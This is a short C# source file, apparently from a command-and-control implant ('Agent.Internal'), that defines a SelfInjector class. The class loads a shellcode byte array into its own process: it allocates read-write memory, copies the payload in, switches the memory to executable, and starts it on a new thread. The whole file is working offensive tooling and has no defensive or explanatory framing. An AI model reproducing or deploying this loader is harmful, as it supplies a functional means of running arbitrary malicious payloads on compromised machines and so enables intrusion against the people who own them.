using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public class SelfInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0, string exeToRun = @"C:\windows\system32\notepad.exe")
        {
            var baseAddr = Native.Kernel32.VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                (int)Native.Kernel32.AllocationType.MEM_COMMIT | (int)Native.Kernel32.AllocationType.MEM_RESERVE,
                (int)Native.Kernel32.AllocationProtect.PAGE_READWRITE);
            if (baseAddr == IntPtr.Zero)
            {
                return false;
            }
            Marshal.Copy(shellcode, 0, baseAddr, shellcode.Length);
            if (!Native.Kernel32.VirtualProtect(baseAddr, shellcode.Length, (int)Native.Kernel32.AllocationProtect.PAGE_EXECUTE_READ, out _))
            {
                return false;
            }
            Native.Kernel32.CreateThread(
                IntPtr.Zero,
                0,
                baseAddr,
                IntPtr.Zero,
                0,
                out var hThread
                );
            if (hThread == IntPtr.Zero)
            {
                return false;
            }
            return true;
        }
    }
}
